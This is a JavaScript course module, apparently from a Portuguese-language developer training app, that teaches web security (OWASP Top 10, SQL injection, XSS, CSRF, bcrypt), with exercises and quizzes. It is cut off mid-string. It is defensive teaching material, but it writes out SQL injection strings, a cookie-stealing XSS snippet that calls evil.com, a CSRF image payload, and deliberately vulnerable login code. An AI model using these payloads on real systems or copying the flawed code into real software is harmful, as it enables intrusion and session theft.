import { miniProjectPhase17 } from '../miniprojects.js';
export const phase17 = {
  id: 'phase-17',
  title: 'Segurança Web',
  phase: 17,
  color: '#ef4444',
  icon: '🔐',
  description: 'OWASP Top 10 na prática: SQL Injection, XSS, CSRF, validação de inputs, bcrypt, rate limiting. Fullstack sênior não abre PR com vulnerabilidade sem saber.',
  checklist: [
    'Conhecer os OWASP Top 10 e identificar cada vulnerabilidade em código real',
    'Prevenir SQL Injection com prepared statements (nunca concatenar inputs)',
    'Entender XSS (Reflected, Stored, DOM-based) e sanitizar outputs corretamente',
    'Implementar proteção CSRF com SameSite cookies ou tokens',
    'Validar e sanitizar inputs no servidor — nunca confiar no cliente',
    'Armazenar senhas com bcrypt — nunca MD5, SHA ou texto puro',
    'Implementar rate limiting em rotas de login e APIs públicas',
    'Configurar headers de segurança com helmet.js',
    'Implementar JWT com access token curto + refresh token rotation',
    'Armazenar JWT corretamente: access em memória, refresh em cookie httpOnly',
    'Configurar HTTPS, HSTS e renovação automática de certificado',
    'Nunca commitar segredos no git — saber remediar se acontecer',
    'Logar eventos de segurança sem expor dados sensíveis (LGPD)',
    'Executar npm audit no CI/CD e avaliar CVEs de dependências',
  ],
  modules: [
    {
      id: 'mod-11-1',
      title: 'OWASP Top 10 e Mentalidade de Segurança',
      duration: '40 min',
      xp: 180,
      content: {
        sections: [
          {
            type: 'text',
            content: 'Segurança não é uma feature que você adiciona depois — é uma mentalidade. O OWASP Top 10 é a lista das 10 categorias de vulnerabilidades mais críticas da web, atualizada de 3 em 3 anos com base em dados reais de brechas. Todo dev fullstack precisa conhecer, reconhecer e saber corrigir cada uma.',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── OWASP TOP 10 (2021) ─────────────────────────────\n//\n// A01 — Broken Access Control          ← #1 mais comum\n//   Usuário acessa recursos que não deveria\n//   Ex: GET /api/users/42 sem verificar se é o dono\n//\n// A02 — Cryptographic Failures\n//   Dados sensíveis sem criptografia ou criptografia fraca\n//   Ex: senhas em MD5, HTTP sem TLS, JWT sem expiração\n//\n// A03 — Injection                       ← clássico\n//   SQL Injection, NoSQL Injection, Command Injection\n//   Ex: query montada com concatenação de string\n//\n// A04 — Insecure Design\n//   Falhas de arquitetura: ausência de rate limiting,\n//   fluxo de negócio sem validação, sem threat modeling\n//\n// A05 — Security Misconfiguration\n//   Configuração padrão insegura, debug ativo em produção,\n//   headers de segurança ausentes, portas desnecessárias abertas\n//\n// A06 — Vulnerable and Outdated Components\n//   Dependências com CVEs conhecidos sem atualizar\n//   Ex: npm audit mostrando High vulnerabilities ignoradas\n//\n// A07 — Identification and Authentication Failures\n//   Brute force sem rate limiting, tokens fracos,\n//   senhas fracas permitidas, sessões que não expiram\n//\n// A08 — Software and Data Integrity Failures\n//   CI/CD sem verificação de integridade, deserialização insegura\n//   Ex: aceitar pacotes npm de fontes não confiáveis\n//\n// A09 — Security Logging and Monitoring Failures\n//   Sem logs de tentativas de login, sem alertas de anomalia\n//   Brechas levam em média 207 dias para serem detectadas\n//\n// A10 — Server-Side Request Forgery (SSRF)\n//   Servidor faz requests para URLs controladas pelo atacante\n//   Ex: API que faz fetch de uma URL passada pelo usuário\n\nconsole.log("Quantas do Top 10 você já viu em produção?");',
          },
          {
            type: 'highlight',
            content: '⚠️ Mentalidade ofensiva: quando você escreve código, pense como um atacante. "O que acontece se eu passar uma string maliciosa aqui? E se eu chamar esse endpoint sem autenticação? E se eu repetir essa requisição 10.000 vezes?" Essa é a diferença entre um dev júnior e um sênior quando se trata de segurança.',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── THREAT MODELING SIMPLIFICADO (STRIDE) ──────────\n// Antes de escrever código, pergunte-se:\n\n// S — Spoofing        (falsificação de identidade)\n//   Alguém pode fingir ser outro usuário?\n//   Prevenção: autenticação forte, tokens assinados\n\n// T — Tampering       (adulteração)\n//   Dados podem ser modificados em trânsito ou em repouso?\n//   Prevenção: HTTPS, assinaturas digitais, hashes de integridade\n\n// R — Repudiation     (negação de autoria)\n//   Usuário pode negar ter feito uma ação?\n//   Prevenção: logs imutáveis com timestamp e user ID\n\n// I — Information Disclosure (vazamento de informação)\n//   Dados sensíveis expostos em logs, responses ou erros?\n//   Prevenção: sanitizar mensagens de erro, não logar senhas\n\n// D — Denial of Service\n//   Sistema pode ser derrubado por sobrecarga?\n//   Prevenção: rate limiting, timeouts, circuit breakers\n\n// E — Elevation of Privilege (escalada de privilégio)\n//   Usuário comum pode executar ações de admin?\n//   Prevenção: autorização granular, principle of least privilege\n\n// Exemplo de checklist para cada endpoint novo:\nconst checklistEndpoint = [\n  "✓ Requer autenticação?",\n  "✓ Verifica autorização (dono do recurso)?",\n  "✓ Valida e sanitiza todos os inputs?",\n  "✓ Rate limiting aplicado?",\n  "✓ Retorna erro genérico (não vaza stack trace)?",\n  "✓ Loga a ação com user ID e timestamp?",\n];\n\nchecklistEndpoint.forEach(item => console.log(item));',
          },
          {
            type: 'common_error',
            title: 'Confiar que segurança é responsabilidade do time de infra',
            wrong: '// "Isso é problema do DevOps, não meu"\n// O dev escreve:\napp.get("/admin/users", (req, res) => {\n  // Sem verificar se req.user.role === "admin"\n  return db.query("SELECT * FROM users");\n});\n// E assume que "o firewall vai bloquear"',
            wrongLabel: 'Firewalls não entendem lógica de negócio. Só o código sabe quem deve ter acesso.',
            right: '// Segurança começa no código, não na infraestrutura\napp.get("/admin/users", requireAuth, requireRole("admin"), async (req, res) => {\n  // Cada camada tem sua responsabilidade:\n  // requireAuth → está logado?\n  // requireRole → tem permissão?\n  const users = await db.query("SELECT id, email, role FROM users");\n  return res.json(users); // nunca retornar senhas!\n});',
            rightLabel: 'Defense in depth: cada camada (código, infra, rede) adiciona proteção independente.',
            explanation: 'Segurança é responsabilidade de cada dev em cada linha de código. Infra protege contra ataques externos, mas não protege contra lógica de negócio incorreta, SQL injection no próprio código, ou dados sensíveis expostos em respostas.',
          },
        ],
        exercise: {
          title: 'Identificar vulnerabilidades em código real',
          description: 'Analise o código abaixo e identifique quantas vulnerabilidades do OWASP Top 10 existem. Para cada uma encontrada, imprima o nome da categoria OWASP e uma descrição curta do problema.',
                    solutionHint: 'Procure: concatenação de SQL (injection), innerHTML com input do usuário (XSS), ausência de verificação de permissão (broken access control).',
starterCode: `// Código com vulnerabilidades propositais — identifique-as!
const express = require('express');
const app = express();
const db = require('./db'); // imagine um SQLite simples

// Endpoint de login
app.post('/login', async (req, res) => {
  const { email, senha } = req.body;
  
  // Busca usuário (vulnerabilidade 1)
  const query = "SELECT * FROM users WHERE email='" + email + "' AND senha='" + senha + "'";
  const user = await db.query(query);
  
  if (user) {
    // Vulnerabilidade 2
    res.json({ success: true, user: user, adminToken: process.env.ADMIN_SECRET });
  } else {
    // Vulnerabilidade 3
    res.status(401).json({ error: 'Usuário ' + email + ' não encontrado no banco de dados PostgreSQL v14.2' });
  }
});

// Endpoint de perfil (vulnerabilidade 4)
app.get('/api/users/:id', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
  res.json(user); // inclui senha_hash, cpf, cartao_credito
});

// Vulnerabilidade 5: sem rate limiting em nenhuma rota

console.log("Quantas vulnerabilidades você encontrou?");`,
          validate: (output, code) => {
            const o = output.toLowerCase();
            return (
              (o.includes('a03') || o.includes('injection') || o.includes('sql')) &&
              (o.includes('a01') || o.includes('access') || o.includes('autoriza') || o.includes('permiss')) &&
              code.includes('console.log') &&
              !code.includes("query = \"SELECT * FROM users WHERE email='\"")
            );
          },
          validateMessage: 'Identifique pelo menos: SQL Injection (A03), Information Disclosure, Broken Access Control (A01), e falta de rate limiting. Imprima cada vulnerabilidade encontrada.',
        },
        quiz: [
          { question: 'O que é o OWASP Top 10?', options: ['Uma lista de frameworks JavaScript seguros', 'As 10 categorias de vulnerabilidades web mais críticas, baseada em dados reais de brechas', 'Um conjunto de bibliotecas de segurança para Node.js', 'Um certificado de segurança para aplicações web'], correct: 1, explanation: 'O OWASP (Open Web Application Security Project) publica o Top 10 como referência para developers e times de segurança. É atualizado a cada 3-4 anos com base em dados reais de ataques.' },
          { question: 'O que é "Defense in Depth"?', options: ['Usar apenas um método de defesa muito forte', 'Confiar apenas no firewall para proteção', 'Múltiplas camadas de segurança independentes — se uma falha, outras protegem', 'Técnica de criptografia de dados em profundidade'], correct: 2, explanation: 'Defense in depth: cada camada (código, autenticação, autorização, rede, infra) protege independentemente. Um bug no código não deve comprometer todo o sistema se as outras camadas estão corretas.' },
          { question: 'Qual é o erro mais comum de acesso (A01)?', options: ['Usar HTTP em vez de HTTPS', 'Usuário acessa recursos de outros usuários por falta de verificação de autorização', 'Senha fraca do usuário', 'CORS mal configurado'], correct: 1, explanation: 'Broken Access Control é o #1 do OWASP há anos. O padrão: endpoint recebe um ID (/api/orders/42) e retorna o recurso sem verificar se o usuário autenticado é o dono do recurso 42.' },
        ],
      },
    },

    // ── Módulo 2: SQL Injection ────────────────────────────────────────────────
    {
      id: 'mod-11-2',
      title: 'SQL Injection: o ataque mais clássico',
      duration: '50 min',
      xp: 220,
      content: {
        sections: [
          {
            type: 'text',
            content: 'SQL Injection existe desde 1998, está no OWASP Top 10 há mais de 20 anos, e ainda derruba sistemas hoje. A causa é sempre a mesma: montar queries SQL concatenando strings com input do usuário. A correção tem uma linha: usar prepared statements.',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── O ATAQUE ─────────────────────────────────────────\n// Login vulnerável — query montada com concatenação\nconst emailInput = "admin@site.com\' OR \'1\'=\'1";\nconst senhaInput = "qualquer_coisa";\n\n// Query resultante:\n// SELECT * FROM users WHERE email=\'admin@site.com\' OR \'1\'=\'1\' AND senha=\'qualquer\'\n// A condição OR \'1\'=\'1\' é SEMPRE verdadeira → retorna todos os usuários!\n// O atacante entra como admin sem saber a senha\n\n// ── VARIAÇÕES DE ATAQUES ─────────────────────────────\n// 1. Bypass de login (visto acima)\n// 2. Exfiltração de dados:\n//    email: \' UNION SELECT username, password, null FROM users --\n//    Retorna todos os usuários e senhas na mesma query!\n\n// 3. Destruição de dados (DROP TABLE):\n//    email: \'; DROP TABLE users; --\n//    Apaga a tabela inteira\n\n// 4. Blind SQL Injection (sem output visível):\n//    email: \' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1) = \'a\n//    O atacante testa caractere por caractere — demora, mas funciona\n\nconsole.log("SQL Injection: o ataque mais simples e mais devastador");',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── A PREVENÇÃO: PREPARED STATEMENTS ────────────────\n// NUNCA concatene inputs do usuário em queries SQL\n\n// ❌ VULNERÁVEL\nasync function loginVulneravel(email, senha) {\n  const query = `SELECT * FROM users WHERE email=\'${email}\' AND senha=\'${senha}\'`;\n  return db.query(query);\n}\n\n// ✅ SEGURO — com prepared statement (pg/node-postgres)\nasync function loginSeguro(email, senha) {\n  const query = "SELECT * FROM users WHERE email = $1 AND senha_hash = $2";\n  // Os parâmetros são passados SEPARADOS da query\n  // O banco trata email e senha como DADOS, nunca como SQL\n  const result = await db.query(query, [email, senha]);\n  return result.rows[0];\n}\n\n// ✅ Com Prisma ORM (TypeScript/Node.js)\n// Prisma usa prepared statements automaticamente\nasync function loginPrisma(email) {\n  return prisma.user.findUnique({\n    where: { email }, // interpolação segura, Prisma parametriza\n  });\n}\n\n// ✅ Com Knex.js\nasync function loginKnex(email) {\n  return knex(\'users\').where({ email }).first();\n  // Knex escapa automaticamente todos os valores\n}\n\n// Regra de ouro:\n// QUALQUER valor vindo de fora (req.body, req.params, req.query,\n// headers, cookies) deve ser tratado como hostil\nconsole.log("Nunca confie no input do usuário");',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── ALÉM DO BÁSICO: SQL INJECTION EM OUTROS CONTEXTOS ──\n\n// 1. ORDER BY / SORT — vulnerável quando dinâmico\n// ❌ Perigoso:\nconst orderBy = req.query.sort; // atacante passa: "1; DROP TABLE users--"\ndb.query(`SELECT * FROM posts ORDER BY ${orderBy}`);\n\n// ✅ Seguro — whitelist de colunas permitidas:\nconst ALLOWED_SORT = [\'created_at\', \'title\', \'views\'];\nconst sort = ALLOWED_SORT.includes(req.query.sort) ? req.query.sort : \'created_at\';\ndb.query(\'SELECT * FROM posts ORDER BY \' + sort); // seguro pq validamos\n\n// 2. LIKE queries com wildcard\n// ❌ Perigoso:\ndb.query(`SELECT * FROM users WHERE name LIKE \'%${searchTerm}%\'`);\n\n// ✅ Seguro:\ndb.query(\'SELECT * FROM users WHERE name ILIKE $1\', [`%${searchTerm}%`]);\n// O $1 trata o % como parte do DADO, não como operador SQL\n\n// 3. NoSQL Injection (MongoDB)\n// ❌ Vulnerável:\ndb.users.find({ email: req.body.email }); // se body = { email: { $gt: "" } }\n// A query vira: WHERE email > "" → retorna TODOS\n\n// ✅ Validar tipo antes:\nconst email = String(req.body.email); // força string\nif (!/^[^@]+@[^@]+\\.[^@]+$/.test(email)) return res.status(400).json({ error: \'Email inválido\' });\ndb.users.find({ email }); // agora seguro\n\nconsole.log("SQL Injection: prevenção é sempre parametrização");',
          },
          {
            type: 'common_error',
            title: 'Usar ORM e achar que está automaticamente protegido',
            wrong: '// Com Sequelize, Raw Query ainda é perigosa!\nconst users = await sequelize.query(\n  `SELECT * FROM users WHERE name = \'${req.params.name}\'`, // ❌\n  { type: QueryTypes.SELECT }\n);\n// Raw queries bypassa as proteções do ORM',
            wrongLabel: 'ORMs protegem apenas seus métodos nativos. Raw queries continuam vulneráveis.',
            right: '// Use sempre os métodos nativos do ORM:\nconst users = await User.findAll({\n  where: { name: req.params.name } // ✅ Sequelize parametriza\n});\n\n// Se precisar de raw query, use replacements:\nconst users = await sequelize.query(\n  "SELECT * FROM users WHERE name = :name",\n  { replacements: { name: req.params.name }, type: QueryTypes.SELECT }\n);',
            rightLabel: 'ORMs com métodos nativos são seguros. Se usar raw, sempre use replacements/bindings.',
            explanation: 'Um ORM não é uma bala de prata. Ele protege automaticamente apenas quando você usa seus métodos de query builder. Ao usar raw queries, você volta ao risco de SQL injection e precisa parametrizar manualmente.',
          },
        ],
        exercise: {
          title: 'Corrigir API com SQL Injection',
          description: 'A função abaixo tem SQL Injection. Reescreva usando prepared statements (simule com a função db.query(sql, params) que já existe). A busca deve funcionar por email e a senha deve ser comparada como hash (use a função hashSenha(s) que já existe).',
                    solutionHint: 'Nunca concatene inputs em SQL. Use parameterized queries: db.query("SELECT * WHERE id = ?", [id]). ORMs como Prisma fazem isso automaticamente.',
starterCode: `// db.query(sql, params) → simula prepared statement seguro
// hashSenha(senha) → retorna hash bcrypt simulado

function db_query(sql, params) {
  // Simulação: substitui $1, $2... pelos params de forma segura
  let result = sql;
  params.forEach((p, i) => {
    result = result.replace('$' + (i+1), JSON.stringify(p));
  });
  console.log("Query segura:", result);
  return { rows: [{ id: 1, email: params[0], nome: "Ana Silva" }] };
}

function hashSenha(s) { return "hash_" + s; }

// ❌ CÓDIGO VULNERÁVEL — corrija abaixo:
function loginVulneravel(email, senha) {
  const query = "SELECT * FROM users WHERE email='" + email + "' AND senha='" + senha + "'";
  console.log("Query:", query);
  return { usuario: email };
}

// ✅ Escreva loginSeguro(email, senha) aqui:
function loginSeguro(email, senha) {
  // Use db_query com prepared statement
  // Compare a senha usando hashSenha()
}

// Teste
loginSeguro("admin@test.com", "minhasenha");
loginSeguro("' OR '1'='1", "qualquer");`,
          validate: (output, code) => {
            return (
              code.includes('db_query') &&
              code.includes('$1') &&
              code.includes('hashSenha') &&
              !code.includes('"SELECT * FROM users WHERE email=\'" + email') &&
              !code.includes("'SELECT * FROM users WHERE email='" + ' + email') &&
              output.includes('Query segura:')
            );
          },
          validateMessage: 'Use db_query com $1 e $2 como placeholders. Não concatene email ou senha diretamente na query.',
        },
        quiz: [
          { question: 'Por que prepared statements previnem SQL Injection?', options: ['Eles limitam o tamanho do input', 'Os parâmetros são enviados separados da query — o banco os trata como dados, nunca como SQL', 'Eles validam que o input é alfanumérico', 'Eles criptografam a query antes de enviar'], correct: 1, explanation: 'Em um prepared statement, a estrutura SQL é compilada primeiro. Quando o parâmetro chega, o banco já sabe que é um valor, não SQL. Mesmo que contenha aspas, ponto e vírgula ou OR, será tratado como string literal.' },
          { question: 'Qual ataque permite extrair dados de outras tabelas via SQL Injection?', options: ['DROP Injection', 'UNION-based SQL Injection', 'Blind Boolean Injection', 'Time-based Injection'], correct: 1, explanation: 'UNION SELECT permite ao atacante anexar uma segunda SELECT que retorna dados de qualquer tabela. Se a query original retorna 2 colunas, a UNION também precisa de 2 — mas pode buscar de users, admin_tokens, etc.' },
          { question: 'Uma API usa Prisma ORM. Ela ainda pode ter SQL Injection?', options: ['Não, ORMs são completamente seguros', 'Sim, se usar raw queries ($queryRaw) sem sanitização', 'Não, Prisma gera queries sempre seguras', 'Só se usar MySQL, com PostgreSQL é seguro'], correct: 1, explanation: 'Prisma\'s $queryRaw permite queries brutas. Se você interpolar variáveis diretamente (Prisma.$queryRaw`SELECT * FROM users WHERE id = ${id}`), é vulnerável. Use Prisma.$queryRaw`...WHERE id = ${Prisma.sql([id])}`.' },
        ],
      },
    },

    // ── Módulo 3: XSS ─────────────────────────────────────────────────────────
    {
      id: 'mod-11-3',
      title: 'XSS: Cross-Site Scripting',
      duration: '45 min',
      xp: 200,
      content: {
        sections: [
          {
            type: 'text',
            content: 'XSS acontece quando sua aplicação exibe conteúdo gerado pelo usuário sem sanitizar — o browser executa o JavaScript malicioso como se fosse legítimo. O atacante pode roubar cookies de sessão, redirecionar o usuário, capturar senhas digitadas ou minerar criptomoeda no browser da vítima.',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── TIPOS DE XSS ─────────────────────────────────────\n\n// 1. REFLECTED XSS (não persistido)\n// Atacante envia link com script na URL:\n// https://site.com/search?q=<script>alert(document.cookie)</script>\n// Se o servidor reflete o parâmetro sem escapar:\napp.get(\'/search\', (req, res) => {\n  res.send(`<p>Você buscou: ${req.query.q}</p>`); // ❌ PERIGOSO\n});\n// Browser executa o script — vítima perde cookies de sessão\n\n// 2. STORED XSS (persistido) — o mais perigoso\n// Atacante salva script no banco (comentário, bio, etc):\nconst comentario = `<script>\n  fetch("https://evil.com/steal?cookie=" + document.cookie);\n</script>`;\n// Se exibido sem sanitizar para TODOS os visitantes:\n// → TODOS os visitantes têm cookies roubados\n\n// 3. DOM-BASED XSS\n// O script não passa pelo servidor — manipula o DOM diretamente\n// Código JavaScript vulnerável no frontend:\nconst name = new URLSearchParams(location.search).get(\'name\');\ndocument.getElementById(\'greeting\').innerHTML = \'Olá, \' + name; // ❌\n// URL: site.com?name=<img src=x onerror=alert(1)>\n\nconsole.log("XSS: sempre sanitize output, não só input");',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── PREVENÇÃO: ESCAPAR OUTPUT ────────────────────────\n// Regra: escape TODOS os dados antes de inserir no HTML\n\n// ❌ PERIGOSO — innerHTML com dados externos\ndocument.getElementById(\'comment\').innerHTML = userComment;\n\n// ✅ SEGURO — textContent nunca executa HTML\ndocument.getElementById(\'comment\').textContent = userComment;\n\n// ✅ No backend: escape HTML antes de renderizar\nfunction escapeHtml(str) {\n  return String(str)\n    .replace(/&/g,  \'&amp;\')\n    .replace(/</g,  \'&lt;\')\n    .replace(/>/g,  \'&gt;\')\n    .replace(/"/g,  \'&quot;\')\n    .replace(/\'/g,  \'&#039;\');\n}\n\n// Template engine como EJS, Handlebars escapam por padrão:\n// <%= userInput %>  → escapa automaticamente ✅\n// <%- userInput %>  → raw, não escapa ❌\n\n// ── CONTENT SECURITY POLICY (CSP) ────────────────────\n// Header HTTP que diz ao browser quais scripts são permitidos\napp.use((req, res, next) => {\n  res.setHeader(\n    \'Content-Security-Policy\',\n    "default-src \'self\'; " +          // apenas recursos do próprio domínio\n    "script-src \'self\' cdn.js; " +   // scripts apenas do próprio site e cdn.js\n    "style-src \'self\' \'unsafe-inline\'; " +\n    "img-src \'self\' data: https:; " +\n    "object-src \'none\';"              // bloqueie Flash e plugins\n  );\n  next();\n});\n// Com CSP, mesmo que XSS injete um script, o browser recusa execut-lo\n// se não vier de uma fonte autorizada\n\n// ── HELMET.JS — configura todos os headers de segurança ─\nconst helmet = require(\'helmet\');\napp.use(helmet()); // ativa CSP, HSTS, XSS Protection e +10 headers\nconsole.log("helmet() em uma linha = muita segurança grátis");',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── REACT E XSS ─────────────────────────────────────\n// React escapa automaticamente tudo que você coloca em JSX — ✅\nfunction Comentario({ texto }) {\n  return <p>{texto}</p>; // seguro, React escapa o conteúdo\n}\n\n// ❌ dangerouslySetInnerHTML — desativa a proteção!\nfunction ComentarioInseguro({ html }) {\n  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n  // Use apenas com conteúdo 100% controlado e sanitizado\n}\n\n// Quando PRECISAR renderizar HTML (ex: editor rich text):\n// Use uma biblioteca de sanitização:\nimport DOMPurify from \'dompurify\';\n\nfunction ComentarioSeguro({ html }) {\n  const htmlLimpo = DOMPurify.sanitize(html, {\n    ALLOWED_TAGS: [\'b\', \'i\', \'em\', \'strong\', \'a\', \'p\', \'br\'],\n    ALLOWED_ATTR: [\'href\', \'target\'],\n  });\n  return <div dangerouslySetInnerHTML={{ __html: htmlLimpo }} />;\n}\n\n// ── COOKIES: httpOnly PREVINE XSS ────────────────────\n// Cookie com httpOnly NÃO pode ser lido por JavaScript\n// document.cookie → não inclui cookies httpOnly\n// Mesmo que XSS aconteça, não consegue roubar sessão!\nres.cookie(\'sessionId\', token, {\n  httpOnly: true,  // não acessível via JS ✅\n  secure: true,    // apenas HTTPS ✅\n  sameSite: \'Strict\', // proteção CSRF ✅\n  maxAge: 24 * 60 * 60 * 1000, // expira em 1 dia\n});\n\nconsole.log("httpOnly + secure + sameSite = cookie blindado");',
          },
          {
            type: 'common_error',
            title: 'Sanitizar no frontend e esquecer do backend',
            wrong: '// Frontend valida antes de enviar\nfunction enviarComentario(texto) {\n  const sanitizado = texto.replace(/<script>/g, "");\n  fetch("/api/comentarios", { body: JSON.stringify({ texto: sanitizado }) });\n}\n// Backend armazena direto no banco sem validar\napp.post("/api/comentarios", (req, res) => {\n  db.save(req.body.texto); // atacante bypassa o frontend!',
            wrongLabel: 'O atacante pode chamar /api/comentarios diretamente, sem passar pelo frontend.',
            right: '// Sempre sanitize no SERVIDOR — o frontend é opcional\nconst DOMPurify = require("isomorphic-dompurify");\n\napp.post("/api/comentarios", (req, res) => {\n  const textoBruto = req.body.texto;\n  const textoLimpo = DOMPurify.sanitize(textoBruto, {\n    ALLOWED_TAGS: ["b", "i", "a"],\n    ALLOWED_ATTR: ["href"],\n  });\n  db.save(textoLimpo); // agora seguro para armazenar\n});',
            rightLabel: 'Validação server-side é obrigatória. Validação client-side é apenas UX.',
            explanation: 'Qualquer request pode ser enviada diretamente para a API com curl ou Postman, ignorando o frontend completamente. A única validação que importa para segurança é a do servidor.',
          },
        ],
        exercise: {
          title: 'Implementar sanitização de comentários',
          description: 'Implemente a função sanitizarComentario(html) que remove tags e atributos perigosos, mantendo apenas formatação básica (b, i, a com href). Depois implemente exibirSeguro(comentario) que usa textContent em vez de innerHTML.',
                    solutionHint: 'Escape HTML: substitua < > & " por entidades HTML. DOMPurify.sanitize() para rich text. Nunca use innerHTML com input não sanitizado do usuário.',
starterCode: `// Implemente as funções de sanitização

// 1. sanitizarComentario(html): remove tags perigosas
//    Permita apenas: <b>, <i>, <a href="..."> (só http/https)
//    Remova: <script>, <img>, <iframe>, onerror=, onclick=, etc
//    Use regex para uma solução simplificada (prod usaria DOMPurify)
function sanitizarComentario(html) {
  // Remova todas as tags exceto b, i, a
  // Valide que href só aceita http/https
}

// 2. exibirSeguro(comentario): retorna objeto {seguro: true/false, texto}
//    Se comentario tiver <script>, retorna {seguro: false}
//    Se passar pela sanitização, retorna {seguro: true, texto: sanitizado}
function exibirSeguro(comentario) {
  // Use sanitizarComentario e verifique se script ainda está presente
}

// Testes
const inputs = [
  "<b>Ótimo post!</b>",
  "<script>alert(document.cookie)</script>",
  "<a href='https://site.com'>Link seguro</a>",
  "<img src=x onerror=alert(1)>",
  "<a href='javascript:alert(1)'>XSS</a>",
];

inputs.forEach(input => {
  const resultado = exibirSeguro(input);
  console.log(resultado.seguro ? "✅ Seguro:" : "❌ Bloqueado:", input.slice(0, 40));
});`,
          validate: (output, code) => {
            return (
              output.includes('✅') &&
              output.includes('❌') &&
              code.includes('sanitizarComentario') &&
              code.includes('exibirSeguro') &&
              (code.includes('replace') || code.includes('regex') || code.includes('RegExp')) &&
              output.toLowerCase().includes('bloqueado')
            );
          },
          validateMessage: 'Implemente sanitizarComentario e exibirSeguro. Scripts e javascript: devem ser bloqueados, tags seguras mantidas.',
        },
        quiz: [
          { question: 'Qual tipo de XSS é mais perigoso e por quê?', options: ['Reflected XSS, pois é mais fácil de executar', 'Stored XSS, pois afeta todos os usuários que visitam a página, sem precisar de link especial', 'DOM XSS, pois bypassa completamente o servidor', 'Todos têm o mesmo impacto'], correct: 1, explanation: 'Stored XSS é o mais perigoso: o script malicioso fica armazenado no banco e é executado para CADA usuário que visita a página. Um único ataque compromete todos. Reflected XSS precisa que a vítima clique em um link específico.' },
          { question: 'O que o header Content-Security-Policy faz?', options: ['Criptografa o conteúdo da página', 'Diz ao browser de quais fontes scripts e recursos são permitidos, bloqueando injeções', 'Autentica o conteúdo do servidor', 'Comprime o HTML enviado'], correct: 1, explanation: 'CSP permite que você declare "esta página só executa scripts de domínios X e Y". Mesmo que XSS consiga injetar um script, o browser recusa executar se não vier de uma fonte autorizada.' },
          { question: 'Por que cookies com httpOnly previnem XSS?', options: ['Eles são criptografados', 'JavaScript não consegue ler cookies httpOnly — mesmo com XSS, o atacante não rouba a sessão', 'Eles expiram em 1 hora', 'Eles são enviados apenas em HTTPS'], correct: 1, explanation: 'O objetivo mais comum do XSS é roubar document.cookie para sequestrar sessões. Com httpOnly, o cookie não aparece em document.cookie — o JavaScript simplesmente não consegue lê-lo, tornando o ataque ineficaz.' },
        ],
      },
    },

    // ── Módulo 4: CSRF + Senhas + Rate Limiting ───────────────────────────────
    {
      id: 'mod-11-4',
      title: 'CSRF, Senhas com bcrypt e Rate Limiting',
      duration: '55 min',
      xp: 220,
      content: {
        sections: [
          {
            type: 'text',
            content: 'Três tópicos essenciais que todo backend precisa ter: CSRF para proteger ações autenticadas, bcrypt para nunca armazenar senhas de forma recuperável, e rate limiting para proteger contra força bruta e abuso de API.',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── CSRF: CROSS-SITE REQUEST FORGERY ─────────────────\n// O ataque: usuário está logado em banco.com\n// Acessa evil.com que tem uma imagem oculta:\n// <img src="https://banco.com/transferir?valor=10000&para=atacante">\n// O browser envia os cookies de sessão automaticamente → transferência acontece!\n\n// PROTEÇÃO 1: SameSite Cookie (mais simples)\nres.cookie(\'session\', token, {\n  sameSite: \'Strict\', // Cookie NÃO é enviado em requests cross-site\n  // Strict: nunca em cross-site (pode quebrar OAuth)\n  // Lax: permite em navegação top-level (GET) — recomendado\n  // None: sempre enviado (precisa de Secure)\n  httpOnly: true,\n  secure: true,\n});\n// Com SameSite=Strict, evil.com não consegue usar os cookies de banco.com\n\n// PROTEÇÃO 2: CSRF Token\n// Servidor gera um token aleatório por sessão\n// Frontend inclui o token em cada request mutante (POST, PUT, DELETE)\n// Servidor valida o token antes de executar\n\nconst csrf = require(\'csurf\');\nconst csrfProtection = csrf({ cookie: true });\n\napp.get(\'/formulario\', csrfProtection, (req, res) => {\n  res.render(\'form\', { csrfToken: req.csrfToken() });\n  // <input type="hidden" name="_csrf" value="<%= csrfToken %>">\n});\n\napp.post(\'/transferir\', csrfProtection, (req, res) => {\n  // csurf verifica automaticamente o _csrf token\n  // Se faltar ou for inválido → 403 Forbidden\n  realizarTransferencia(req.body);\n});\n\nconsole.log("CSRF: SameSite=Lax é o mínimo hoje em dia");',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── SENHAS: NUNCA ARMAZENE TEXTO PURO ────────────────\n// Hashes ruins para senhas:\n// MD5, SHA1, SHA256 — rápidos demais (bilhões/seg com GPU)\n// Sem salt — rainbow tables crackeiam em segundos\n\n// ✅ bcrypt — lento por design (faz isso de propósito!)\nconst bcrypt = require(\'bcrypt\');\n\n// Cadastro de usuário\nasync function criarUsuario(email, senhaTexto) {\n  const saltRounds = 12; // 2^12 = 4096 iterações\n  // saltRounds=10: ~100ms | saltRounds=12: ~400ms | saltRounds=14: ~1.6s\n  // Lento para o atacante, OK para o usuário (1 vez no login)\n\n  const senhaHash = await bcrypt.hash(senhaTexto, saltRounds);\n  // Resultado: "$2b$12$salt.hash" — inclui o salt e o custo embutidos\n\n  await db.query(\n    "INSERT INTO users (email, senha_hash) VALUES ($1, $2)",\n    [email, senhaHash]\n  );\n  // Nunca armazene senhaTexto! Nem criptografada!\n}\n\n// Login\nasync function verificarLogin(email, senhaTexto) {\n  const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);\n  if (!user) return null;\n\n  const senhaCorreta = await bcrypt.compare(senhaTexto, user.senha_hash);\n  // compare é constante em tempo (evita timing attacks)\n  if (!senhaCorreta) return null;\n\n  return user; // login bem-sucedido\n}\n\n// ── ALTERNATIVAS MODERNAS ────────────────────────────\n// Argon2 (vencedor do Password Hashing Competition 2015)\n// const argon2 = require(\'argon2\');\n// const hash = await argon2.hash(senha); // mais seguro que bcrypt\n\n// NUNCA use:\n// ❌ md5(senha)\n// ❌ sha256(senha)\n// ❌ sha256(senha + "meu_salt_secreto")\n// ❌ base64(senha) — isso não é hash!\n// ❌ AES(senha) — criptografia é reversível!\nconsole.log("bcrypt: lento por design é uma feature, não 